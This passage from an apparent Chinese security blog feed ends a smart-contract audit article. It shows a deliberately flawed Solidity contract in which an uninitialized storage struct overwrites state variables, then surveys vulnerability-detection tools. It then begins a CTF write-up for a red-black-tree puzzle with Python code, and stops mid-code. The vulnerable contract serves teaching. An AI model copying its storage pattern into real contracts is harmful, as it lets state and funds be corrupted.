title="变量覆盖varreplace"></a>变量覆盖<sup><a href="#fn_varreplace" id="reffn_varreplace">varreplace</a></sup></h1><p>以如下代码为例，Solidity存储机制的问题，p初始化后的name、mappedAddress地址会与变量testA、testB地址重合，导致调用test函数给结构体p赋值后，变量testA和testB的值也会被覆盖。</p><p>复现：</p><ol><li>调用TestContract.test()方法</li><li>检查testA和testB的值，已被改变</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line">contract  TestContract&#123;</span><br><span class="line"></span><br><span class="line">    int public testA;</span><br><span class="line">    address public testB;</span><br><span class="line"></span><br><span class="line">    struct Person &#123;</span><br><span class="line">        int name;</span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">int _name, address _mappedAddress</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        Person p;</span><br><span class="line">        p.name = _name;    <span class="comment">//testA被改变</span></span><br><span class="line">        p.mappedAddress = _mappedAddress;    <span class="comment">//testB被改变</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h1><ul><li><p>DASP<sup><a href="#fn_dasp" id="reffn_dasp">dasp</a></sup>总结了以太坊合约的Top10安全性问题</p></li><li><p>luu等人<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup>设计一套基于符号执行的智能合约安全审计工具oyente（已做过演示，目前可以检测的漏洞有<strong>整形溢出，合约依赖交易顺序，依赖时间戳的漏洞，未处理异常和重入漏洞</strong>。</p></li><li><p>Nikolic<sup><a href="#fn_maian" id="reffn_maian">maian</a></sup>等人设计了一套符号执行检测智能合约的工具MAIAN，这些问题包括<strong>合约永久锁定资金，资金可被恶意用户转账以及被任意用户杀死</strong>，我们选用了34200个合约（去重复后有2365个），我们抽样调查了3759个合约，得到89%的正确率。</p></li><li><p>jiang等人<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup>设计了一套基于fuzz的智能合约审计工具ContractFuzzer，他们通过在EVM中插桩，以此获取程序在执行中产生的信息，通过预先设置的测试准则发现漏洞，他们设计的工具可以检测<strong>无Gas发送、Exception Disorder、重入漏洞、依赖于时间戳漏洞、依赖于区块高度漏洞、危险的Delegatecall、合约永久锁定资金</strong>7大安全性问题，经过试验，ContractFuzzer发现漏洞的准确率较高，但是相较于Oyente，此工具找到的漏洞数量较少。</p></li><li><p>Liu等人<sup><a href="#fn_ReGuard" id="reffn_ReGuard">ReGuard</a></sup>构建了基于fuzz的智能合约检测工具，旨在检测合约中的<strong>重入漏洞</strong>，实验表明，相较于Oyente，该工具有更高的准确率，并且能发现更多数量的问题。</p></li><li><p>chen等人<sup><a href="#fn_DoS" id="reffn_DoS">DoS</a></sup>通过动态调整Op执行的gas花费阻止DoS攻击（通过反复执行小gas的opcode，消耗系统资源造成dos）。</p></li></ul><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><blockquote id="fn_DoS"><sup>DoS</sup>. Chen, Ting, et al. “An Adaptive Gas Cost Mechanism for Ethereum to Defend Against Under-Priced DoS Attacks.” <em>International Conference on Information Security Practice and Experience</em>. Springer, Cham, 2017.<a href="#reffn_DoS" title="Jump back to footnote [DoS] in the text."> &#8617;</a></blockquote><blockquote id="fn_smarter"><sup>smarter</sup>. Luu, Loi, et al. “Making smart contracts smarter.” Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2016.<a href="#reffn_smarter" title="Jump back to footnote [smarter] in the text."> &#8617;</a></blockquote><blockquote id="fn_blackhat2018"><sup>blackhat2018</sup>. Bai, Zhenxuan, et al. “Your May Have Paid More than You Imagine：Replay Attacks on Ethereum Smart Contracts.” Blackhat. 2018<a href="#reffn_blackhat2018" title="Jump back to footnote [blackhat2018] in the text."> &#8617;</a></blockquote><blockquote id="fn_seebug1"><sup>seebug1</sup>. 以太坊智能合约安全入门了解一下（上）, <a href="https://paper.seebug.org/601/" target="_blank" rel="noopener">https://paper.seebug.org/601/</a><a href="#reffn_seebug1" title="Jump back to footnote [seebug1] in the text."> &#8617;</a></blockquote><blockquote id="fn_contractfuzzer"><sup>contractfuzzer</sup>. Bo Jiang, Ye Liu, and W.K. Chan. 2018. ContractFuzzer: Fuzzing Smart Contracts for Vulnerability Detection. In Proceedings ofthe 33rd IEEE/ACM International Conference on Automated Software Engineering (ASE’18), September 3–7, Montpellier, France, 10 pages.<a href="#reffn_contractfuzzer" title="Jump back to footnote [contractfuzzer] in the text."> &#8617;</a></blockquote><blockquote id="fn_varreplace"><sup>varreplace</sup>. Solidity中存储方式错误使用所导致的变量覆盖，<a href="http://www.freebuf.com/articles/blockchain-articles/175237.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/blockchain-articles/175237.html</a><a href="#reffn_varreplace" title="Jump back to footnote [varreplace] in the text."> &#8617;</a></blockquote><blockquote id="fn_maian"><sup>maian</sup>. Ivica Nikolic, Aashish Kolluri, Ilya Sergey, Prateek Saxena, and Aquinas Hobor. 2018. Finding The Greedy, Prodigal, and Suicidal Contracts at Scale. (2018). DOI:<a href="https://doi.org/arXiv:1802.06038v1" target="_blank" rel="noopener">https://doi.org/arXiv:1802.06038v1</a><a href="#reffn_maian" title="Jump back to footnote [maian] in the text."> &#8617;</a></blockquote><blockquote id="fn_ReGuard"><sup>ReGuard</sup>. Liu, C., Liu, H., Cao, Z., Chen, Z., Chen, B., &amp; Roscoe, B. (2018). ReGuard: Finding reentrancy bugs in smart contracts. Proceedings - International Conference on Software Engineering, 65–68. <a href="https://doi.org/10.1145/3183440.3183495" target="_blank" rel="noopener">https://doi.org/10.1145/3183440.3183495</a><a href="#reffn_ReGuard" title="Jump back to footnote [ReGuard] in the text."> &#8617;</a></blockquote><blockquote id="fn_dasp"><sup>dasp</sup>. <a href="http://www.dasp.co/" target="_blank" rel="noopener">http://www.dasp.co/</a><a href="#reffn_dasp" title="Jump back to footnote [dasp] in the text."> &#8617;</a></blockquote>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码安全 </tag>
            
            <tag> 区块链 </tag>
            
            <tag> 智能合约 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018网鼎杯二叉树&amp;martricks wp</title>
      <link href="/ctf-2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E4%BA%8C%E5%8F%89%E6%A0%91-martrickswp/"/>
      <url>/ctf-2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E4%BA%8C%E5%8F%89%E6%A0%91-martrickswp/</url>
      
        <content type="html"><![CDATA[<p>2018年网鼎杯，emmm，好不容易看到个算法题还花了很长时间，太难过了T_T</p><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>下载题目后，得到一张红黑树的图片和README.txt. 将readme进行base64解码可以得到hit：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.这是一棵红黑树</span><br><span class="line">2.树从1-59上的果子依次为 ek`~3c:gf017b744/b38fd~abm7g5489e2&#123;lf6z8d16hae`98&#125;b|-21m.e:</span><br><span class="line">3.依次从树上取走第 18,35,53,50,14,28,19,6,54,36 个果子,过程中保持红黑树性质不变</span><br><span class="line">4.tmpflag为第 8,56,47,37,52,34,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23 个果子</span><br><span class="line">5.flag为 tmpflag 红色果子 ASCII +1 , 黑色果子 ASCII-1</span><br><span class="line">6.让我们愉快的开始获取flag吧</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>经过提示，首先需要找一份红黑树的实现，并且按照图片构造一颗红黑树(如果不按图片会出现多解情况，因为这点被坑惨)，以下给出一个很好的python版红黑树实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">BLACK = <span class="number">0</span></span><br><span class="line">RED = <span class="number">1</span></span><br><span class="line"><span class="comment">#graphic elements of rbtree for printing</span></span><br><span class="line">VC = <span class="string">'│'</span></span><br><span class="line">HC = <span class="string">'─'</span></span><br><span class="line">SIZE = <span class="number">3</span></span><br><span class="line">RIG = <span class="string">'┌'</span> + HC * SIZE</span><br><span class="line">LEF = <span class="string">'└'</span> + HC * SIZE</span><br><span class="line">SP = chr(<span class="number">32</span>)</span><br><span class="line">IND1 = SP * (SIZE + <span class="number">1</span>)</span><br><span class="line">IND2 = VC + SP * SIZE</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rbnode</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key=None, value=None, color=BLACK,left=None,right=None,p=None)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.color = color</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line">        self.p = p</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s%s%s'</span> % (self.key,<span class="string">'◆'</span> <span class="keyword">if</span> self.color <span class="keyword">is</span> BLACK <span class="keyword">else</span> <span class="string">'◇'</span>,self.value )</span><br><span class="line"></span><br><span class="line">_NONE=rbnode()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rbtree</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data=False,default_value=<span class="number">0</span>, nodes=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> nodes:</span><br><span class="line">            self.root = nodes[<span class="number">28</span>]</span><br><span class="line">            self.default_value = default_value <span class="comment">#for method: force_search</span></span><br><span class="line">            self.nil = _NONE</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.nil = _NONE</span><br><span class="line">            self.root = self.nil</span><br><span class="line">            self.default_value = default_value <span class="comment">#for method: force_search</span></span><br><span class="line">            <span class="keyword">if</span> hasattr(data, <span class="string">'__iter__'</span>):</span><br><span class="line">                <span class="keyword">for</span> key, value <span class="keyword">in</span> data:</span><br><span class="line">                    self.insert(rbnode(key,value))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\n'</span>.join(self.graph())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">graph</span><span class="params">(self, x=False, prefix=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="string">"beautifully print rbtree, big key node first"</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            p = x.p</span><br><span class="line">            last_prefix = <span class="string">''</span></span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">                pp = p.p</span><br><span class="line">                last_prefix = LEF <span class="keyword">if</span> p.left <span class="keyword">is</span> x <span class="keyword">else</span> RIG</span><br><span class="line">                <span class="keyword">if</span> pp <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">                    <span class="keyword">if</span> (pp.left <span class="keyword">is</span> p) <span class="keyword">is</span> (p.left <span class="keyword">is</span> x):</span><br><span class="line">                        prefix = prefix + IND1</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        prefix = prefix + IND2</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.graph(x.right, prefix)</span><br><span class="line">            <span class="keyword">yield</span> <span class="string">'%s%s%s'</span> % (prefix, last_prefix, x)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.graph(x.left, prefix)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, key, x=False)</span>:</span></span><br><span class="line">        <span class="string">"find node according to key, return self.nil if not found"</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">while</span> (x <span class="keyword">is</span> <span class="keyword">not</span> self.nil) <span class="keyword">and</span> (key != x.key):</span><br><span class="line">            <span class="keyword">if</span> key &lt; x.key:</span><br><span class="line">                x = x.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = x.right</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, z)</span>:</span></span><br><span class="line">        <span class="string">"insert z node with key and value"</span></span><br><span class="line">        y = self.nil</span><br><span class="line">        x = self.root</span><br><span class="line">        <span class="keyword">while</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            y = x</span><br><span class="line">            <span class="keyword">if</span> z.key &lt; x.key:</span><br><span class="line">                x = x.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = x.right</span><br><span class="line">        z.p = y</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = z</span><br><span class="line">        <span class="keyword">elif</span> z.key &lt; y.key:</span><br><span class="line">            y.left = z</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y.right = z</span><br><span class="line">        z.left = self.nil</span><br><span class="line">        z.right = self.nil</span><br><span class="line">        z.color = RED</span><br><span class="line">        self.insert_fixup(z)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, z)</span>:</span></span><br><span class="line">        y = z</span><br><span class="line">        y_original_color = y.color</span><br><span class="line">        <span class="keyword">if</span> z.left <span class="keyword">is</span> self.nil:</span><br><span class="line">            x = z.right</span><br><span class="line">            self.transplant(z, x)</span><br><span class="line">        <span class="keyword">elif</span> z.right <span class="keyword">is</span> self.nil:</span><br><span class="line">            x = z.left</span><br><span class="line">            self.transplant(z, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y = self.minimum(z.right)</span><br><span class="line">            y_original_color = y.color</span><br><span class="line">            x = y.right</span><br><span class="line">            <span class="keyword">if</span> y.p <span class="keyword">is</span> z:</span><br><span class="line">                x.p = y</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.transplant(y, x)</span><br><span class="line">                y.right = z.right</span><br><span class="line">                y.right.p = y</span><br><span class="line">            self.transplant(z, y)</span><br><span class="line">            y.left = z.left</span><br><span class="line">            y.left.p = y</span><br><span class="line">            y.color = z.color</span><br><span class="line">        <span class="keyword">if</span> y_original_color <span class="keyword">is</span> BLACK:</span><br><span class="line">            self.delete_fixup(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.root <span class="keyword">is</span> self.nil</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">right_walk</span><span class="params">(self, x=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.right_walk(x.right)</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.right_walk(x.left)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">left_walk</span><span class="params">(self, x=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.left_walk(x.left)</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.left_walk(x.right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">force_search</span><span class="params">(self,key)</span>:</span></span><br><span class="line">        y = self.nil</span><br><span class="line">        x = self.root</span><br><span class="line">        <span class="keyword">while</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">if</span> key == x.key:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line">            y = x</span><br><span class="line">            <span class="keyword">if</span> key &lt; x.key:</span><br><span class="line">                x = x.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = x.right</span><br><span class="line">        z = rbnode()</span><br><span class="line">        original_z = z</span><br><span class="line">        z.key = key</span><br><span class="line">        z.value = self.default_value</span><br><span class="line">        z.p = y</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = z</span><br><span class="line">        <span class="keyword">elif</span> z.key &lt; y.key:</span><br><span class="line">            y.left = z</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y.right = z</span><br><span class="line">        z.left = self.nil</span><br><span class="line">        z.right = self.nil</span><br><span class="line">        z.color = RED</span><br><span class="line">        self.insert_fixup(z)</span><br><span class="line">        <span class="keyword">return</span> original_z</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maximum</span><span class="params">(self, x=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">while</span> x.right <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            x = x.right</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minimum</span><span class="params">(self, x=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">while</span> x.left <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            x = x.left</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">successor</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"return node with smallest key greater than x.key"</span></span><br><span class="line">        <span class="keyword">if</span> x.right <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">return</span> self.minimum(x.right)</span><br><span class="line">        y = x.p</span><br><span class="line">        <span class="keyword">while</span> (y <span class="keyword">is</span> <span class="keyword">not</span> self.nil) <span class="keyword">and</span> (x <span class="keyword">is</span> y.right):</span><br><span class="line">            x = y</span><br><span class="line">            y = y.p</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predecessor</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"return node with biggest key lower than x.key"</span></span><br><span class="line">        <span class="keyword">if</span> x.left <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">return</span> self.maximum(x.left)</span><br><span class="line">        y = x.p</span><br><span class="line">        <span class="keyword">while</span> (y <span class="keyword">is</span> <span class="keyword">not</span> self.nil) <span class="keyword">and</span> (x <span class="keyword">is</span> y.left):</span><br><span class="line">            x = y</span><br><span class="line">            y = y.p</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">left_rotate</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        y = x.right</span><br><span class="line">        x.right = y.left</span><br><span class="line">        <span class="keyword">if</span> y.left <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            y.left.p = x</span><br><span class="line">        y.p = x.p</span><br><span class="line">        <span class="keyword">if</span> x.p <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = y</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> x.p.left:</span><br><span class="line">                x.p.left = y</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x.p.right = y</span><br><span class="line">        y.left = x</span><br><span class="line">        x.p = y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">right_rotate</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        y = x.left</span><br><span class="line">        x.left = y.right</span><br><span class="line">        <span class="keyword">if</span> y.right <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            y.right.p = x</span><br><span class="line">        y.p = x.p</span><br><span class="line">        <span class="keyword">if</span> x.p <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = y</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> x.p.right:</span><br><span class="line">                x.p.right = y</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x.p.left = y</span><br><span class="line">        y.right = x</span><br><span class="line">        